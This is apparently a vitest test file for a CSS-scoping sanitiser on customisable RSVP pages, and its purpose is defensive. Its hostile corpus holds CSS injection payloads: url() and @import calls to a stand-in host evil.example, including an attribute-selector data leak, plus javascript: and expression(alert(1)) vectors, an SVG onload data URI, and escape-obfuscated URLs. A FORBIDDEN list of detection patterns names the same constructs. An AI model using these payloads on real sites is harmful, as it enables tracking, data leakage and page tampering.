import { describe, expect, it } from "vitest";
import { DEFAULT_SCOPE, MAX_CSS_LENGTH, PROTECTED_Z_INDEX, scopeCss } from "../custom/css.js";

const GUARD = ":not(.rsvp-protected):not(.rsvp-protected *)";
const scope = (css: string, options = {}) => scopeCss(css, options);
const codes = (css: string) => scope(css).issues.map((issue) => issue.code);

/** No byte of any output may contain these, whatever the input. */
const FORBIDDEN = [/@import/i, /@font-face/i, /@keyframes/i, /expression\s*\(/i, /javascript:/i, /vbscript:/i, /behavior/i, /-moz-binding/i, /position\s*:\s*(fixed|sticky)/i, /\\/, /image-set/i, /attr\s*\(/i, /!important/i, /--/, /(^|[,{};])\s*(html|body|:root|\*)\s*[,{ ]/i, /visibility/i, /opacity/i, /display\s*:\s*none/i];

function attack(css: string): string {
  const out = scope(css).css;
  for (const pattern of FORBIDDEN) expect(out, `${pattern} in ${JSON.stringify(out)} from ${JSON.stringify(css)}`).not.toMatch(pattern);
  for (const selector of out.split("}").map((chunk) => chunk.split("{")[0] ?? "").filter((chunk) => chunk && !chunk.startsWith("@media"))) {
    for (const piece of selector.split(",")) expect(piece.trim().startsWith(DEFAULT_SCOPE), `unscoped selector ${piece}`).toBe(true);
  }
  return out;
}

describe("scopeCss: what is kept", () => {
  it("prefixes every selector with the scope and guards the protected blocks", () => {
    const { css, issues } = scope("p { color: #333; margin: 0 0 12px } h2, .titulo > span { font-size: 24px }");
    expect(css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:#333;margin:0 0 12px}\n${DEFAULT_SCOPE} h2${GUARD},${DEFAULT_SCOPE} .titulo > span${GUARD}{font-size:24px}`);
    expect(issues).toEqual([]);
  });

  it("puts the guard before a pseudo-element and keeps allowed pseudo-classes", () => {
    expect(scope("a:hover::before { content: 'x'; color: red }").css).toBe(`${DEFAULT_SCOPE} a:hover${GUARD}::before{content:'x';color:red}`);
    expect(scope("li:nth-child(2n+1) { color: red }").css).toContain("li:nth-child(2n+1)");
    expect(scope("p:not(.a) { color: red }").css).toContain("p:not(.a)");
  });

  it("keeps media queries on screen features and scopes the rules inside", () => {
    const { css } = scope("@media (max-width: 600px) and (prefers-color-scheme: dark) { p { color: #fff } }");
    expect(css).toBe(`@media (max-width: 600px) and (prefers-color-scheme: dark){${DEFAULT_SCOPE} p${GUARD}{color:#fff}}`);
    expect(scope("@media (prefers-reduced-motion: no-preference) { .a { transition: color 200ms ease } }").css).toContain("transition:color 200ms ease");
  });

  it("allows catalogue fonts, gradients, media-store backgrounds, bounded offsets and rotate/scale", () => {
    const css = `.a { font-family: "Playfair Display", serif; background: linear-gradient(#fff, #eee); background-image: url(/media/public/assets/abc/full); margin-left: -12px; transform: rotate(-3deg) scale(1.1); font-size: 1rem; z-index: 5; position: relative; color: var(--rsvp-accent) }`;
    const { css: out, issues } = scope(css);
    expect(issues).toEqual([]);
    for (const part of ["font-family:\"Playfair Display\", serif", "linear-gradient", "url(/media/public/assets/abc/full)", "margin-left:-12px", "rotate(-3deg) scale(1.1)", "z-index:5", "var(--rsvp-accent)"]) expect(out).toContain(part);
  });

  it("a custom scope can be given, and only as a class", () => {
    expect(scope("p{color:red}", { scope: ".mi-boda" }).css).toContain(".mi-boda p");
    expect(() => scope("p{color:red}", { scope: "body" })).toThrow();
    expect(() => scope("p{color:red}", { scope: ".a .b" })).toThrow();
  });

  it("comments are dropped and the result is stable when scoped output is fed back as comments-free input", () => {
    expect(scope("/* hola */ p { /* x */ color: red }").css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:red}`);
  });
});

describe("scopeCss: hostile corpus", () => {
  const vectors: readonly string[] = [
    "@import url(https://evil.example/x.css); p { color: red }",
    '@import "https://evil.example/x.css";',
    "@font-face { font-family: X; src: url(https://evil.example/x.woff) }",
    "@keyframes spin { to { transform: rotate(360deg) } }",
    "@charset 'utf-8'; p { color: red }",
    "@namespace svg url(http://www.w3.org/2000/svg);",
    "@page { margin: 0 }",
    "@supports (display: grid) { p { color: red } }",
    "@container (min-width: 1px) { p { color: red } }",
    "@layer x { p { color: red } }",
    "@scope (body) { p { color: red } }",
    "@property --x { syntax: '<color>'; inherits: false }",
    "html { display: none }",
    "body { background: red }",
    ":root { --x: 1 }",
    "* { color: red }",
    "html body p { color: red }",
    "p, body { color: red }",
    "body > p { color: red }",
    ":host { color: red }",
    "::backdrop { color: red }",
    "p { position: fixed; top: 0; left: 0; width: 100%; height: 100% }",
    "p { position: sticky }",
    "p { position: FIXED }",
    "p { position: fixed !important }",
    "p { background: url(https://evil.example/t.gif) }",
    "p { background: url(//evil.example/t.gif) }",
    "p { background: url('data:image/svg+xml,<svg onload=alert(1)>') }",
    "p { background: url(javascript:alert(1)) }",
    "p { background-image: url(/media/public/assets/../../etc/passwd) }",
    "p { background: image-set('https://evil.example/a.png' 1x) }",
    "p { list-style: url(https://evil.example/a.png) }",
    "p { content: url(https://evil.example/a.png) }",
    "p { content: attr(href) }",
    "p { width: expression(alert(1)) }",
    "p { behavior: url(x.htc) }",
    "p { -moz-binding: url(x.xml#a) }",
    "p { color: red; background: u\\72l(https://evil.example/t.gif) }",
    "p { color: \\72 ed }",
    "p\\20 { color: red }",
    ".a\\.b { color: red }",
    "p { --x: url(https://evil.example/t.gif); background: var(--x) }",
    "p { background: var(--x) }",
    "p { visibility: hidden }",
    "p { opacity: 0 }",
    "p { display: none }",
    "p { clip-path: inset(100%) }",
    "p { filter: blur(0) opacity(0) }",
    "p { mask: linear-gradient(#000, transparent) }",
    "p { overflow: hidden; max-height: 0 }",
    "p { pointer-events: none }",
    "p { font-size: 0 }",
    "p { font-size: 12px }",
    "p { font-size: 0.5rem }",
    "p { font-size: calc(1px) }",
    "p { z-index: 9999 }",
    "p { z-index: 1000 }",
    "p { margin-left: -99999px }",
    "p { top: -5000px; position: relative }",
    "p { text-indent: -9999px }",
    "p { transform: translateY(5000px) }",
    "p { transform: scale(0) }",
    "p { font-family: 'Comic Sans MS' }",
    "p { color: red; } } p { color: blue }",
    "p { color: red",
    "p { animation: x 1s infinite }",
    "p { transition: all 1s; mix-blend-mode: difference }",
    ".rsvp-protected { color: red }",
    ".rsvp-gifts-cta { display: none }",
    ".de-bar { display: none }",
    "[data-rsvp-protected] { opacity: 0 }",
    "a[href^='https://'] { background: url(https://evil.example/leak?x) }",
    "#gifts { display: none }",
    "p:has(.rsvp-protected) { color: red }",
    "p:is(body) { color: red }",
    "p::part(x) { color: red }",
    "svg { width: 1px }",
    "button { display: none }",
    "p { color: red; & b { color: blue } }",
    "@media (min-width: 1px) { @media (max-width: 9px) { p { color: red } } }",
    "@media screen and (-webkit-min-device-pixel-ratio: 0) { p { color: red } }",
    "@media (min-width: expression(alert(1))) { p { color: red } }",
    "p { color: red\u0000; background: url(x) }"
  ];

  it.each(vectors)("neutralises %s", (vector) => { attack(vector); });

  it("keeps the harmless part of a mixed sheet and reports what it dropped", () => {
    const { css, issues } = scope("p { color: red; position: fixed; background: url(https://evil.example/x); margin: 4px }");
    expect(css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:red;margin:4px}`);
    expect(issues.map((issue) => issue.code)).toEqual(["VALUE_REJECTED", "VALUE_REJECTED"]);
  });

  it("rejects the exact forbidden values by code", () => {
    expect(codes("@import url(x);")).toContain("AT_RULE_REMOVED");
    expect(codes("body{color:red}")).toContain("SELECTOR_REJECTED");
    expect(codes("p{opacity:0}")).toContain("PROPERTY_REJECTED");
    expect(codes("p{position:fixed}")).toContain("VALUE_REJECTED");
    expect(codes("p{color:red!important}")).toContain("IMPORTANT_REMOVED");
    expect(codes("p{color:\\72 ed}")).toContain("ESCAPE_REJECTED");
    expect(codes("@media (foo: 1) { p { color: red } }")).toContain("MEDIA_REJECTED");
    expect(codes("p{color:red")).toEqual(["SYNTAX"]);
    expect(scope("p{color:red").css).toBe("");
  });

  it("no rule survives that could reach the reserved classes or the protected blocks", () => {
    expect(scope(".rsvp-gifts-cta{color:red}").css).toBe("");
    expect(scope(".rsvp-protected, .rsvp-protected *{color:red}").css).toBe("");
    expect(scope("p .rsvp-protected{color:red}").css).toBe("");
    expect(scope("p:not(.rsvp-protected){color:red}").css).toBe("");
    const guarded = scope("div p{color:red}").css;
    expect(guarded).toContain(GUARD);
  });

  it("a rule with a mix of good and bad selectors keeps only the good ones", () => {
    expect(scope("p, body, .a { color: red }").css).toBe(`${DEFAULT_SCOPE} p${GUARD},${DEFAULT_SCOPE} .a${GUARD}{color:red}`);
  });

  it("limits length and the number of rules", () => {
    expect(scope("p{color:red}".repeat(MAX_CSS_LENGTH)).issues[0]?.code).toBe("TOO_LONG");
    const many = scope(Array.from({ length: 450 }, (_, index) => `.c${index}{color:red}`).join(""));
    expect(many.issues.some((issue) => issue.code === "TOO_MANY_RULES")).toBe(true);
    expect((many.css.match(/\{/g) ?? []).length).toBe(400);
  });

  it("the protected z-index is out of any author's reach", () => {
    expect(PROTECTED_Z_INDEX).toBeGreaterThan(100);
    expect(scope("p{z-index:101}").css).toBe("");
    expect(scope("p{z-index:100}").css).toContain("z-index:100");
  });

  it("an unparseable sheet gives an empty result with a SYNTAX issue", () => {
    expect(scope("p { color: red; } @media").issues.length).toBeGreaterThan(0);
    expect(scope("}}}{{{").css).toBe("");
  });
});
